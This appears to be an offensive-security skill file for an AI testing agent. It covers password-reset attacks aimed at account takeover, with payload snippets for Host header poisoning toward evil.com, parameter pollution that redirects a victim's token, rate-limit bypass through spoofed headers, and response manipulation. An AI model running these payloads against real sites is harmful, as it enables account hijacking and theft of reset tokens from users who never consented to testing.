# Password Reset Attacks Skill

## Goal

Identify and exploit vulnerabilities in password reset functionality to take over user accounts.

## Methodology

1. **Map Reset Flow:** Understand token generation, delivery, and validation
2. **Test Token Security:** Analyze predictability and expiration
3. **Test Host Header Injection:** Redirect reset links to attacker domain
4. **Exploit Logic Flaws:** Bypass verification or reuse tokens
5. **Account Takeover:** Complete unauthorized password change

## Host Header Poisoning

```http
# Inject attacker domain in reset link
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@example.com

# Reset link generated: https://evil.com/reset?token=xyz
```

## Token Predictability

```bash
# Analyze multiple tokens for patterns:
- Sequential numbers
- Timestamps
- User ID encoded
- Weak hash (MD5 of email+time)

# Example: token = base64(email:timestamp)
# Attacker can generate valid tokens
```

## Token Leakage

```bash
# Referer header leakage
1. Request reset link
2. Link contains token in URL
3. Page has external resources
4. Token leaks via Referer header

# Check in password reset page for:
- External JS/CSS
- Images from third parties
- Analytics scripts
```

## Response Manipulation

```http
# Change response to indicate success
{"error": "Invalid token"}
# Modify to:
{"success": true}

# May bypass client-side validation
```

## Token Reuse

```bash
# Test if token can be used multiple times
# Test if old token valid after new one requested
# Test if token valid after password changed
```

## Rate Limiting Bypass

```bash
# Bypass rate limit on token requests
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 1.2.3.5
X-Remote-IP: 1.2.3.6
X-Remote-Addr: 1.2.3.7

# Request multiple tokens rapidly
```

## Parameter Pollution

```bash
# Send reset for two emails - victim receives attacker's token
email=victim@example.com&email=attacker@example.com
email[]=victim@example.com&email[]=attacker@example.com
email=victim@example.com,attacker@example.com
```

## Account Enumeration

```bash
# Different responses for valid/invalid emails
POST /forgot-password HTTP/1.1
email=valid@example.com -> "Reset link sent"
email=invalid@example.com -> "Email not found"
```

## Insecure Token Storage

```bash
# Token exposed in:
- URL query strings (browser history)
- Cookie values (accessible to XSS)
- API responses
- Error messages
```

## Password Policy Bypass

```bash
# Set weak password during reset
# May have different validation than registration
password=123456
```

## Tools

* **Burp Suite** - Intercept and modify reset requests
* **curl** - Test Host header injection
* **Browser DevTools** - Monitor token handling

## Guidance for AI

* Activate when testing password reset functionality
* Host header injection is very common vulnerability
* Analyze token entropy and format for predictability
* Check if tokens expire appropriately (typically 1-24 hours)
* Test all HTTP headers that might affect link generation
* Account enumeration via reset is a privacy concern
* Check if reset invalidates active sessions
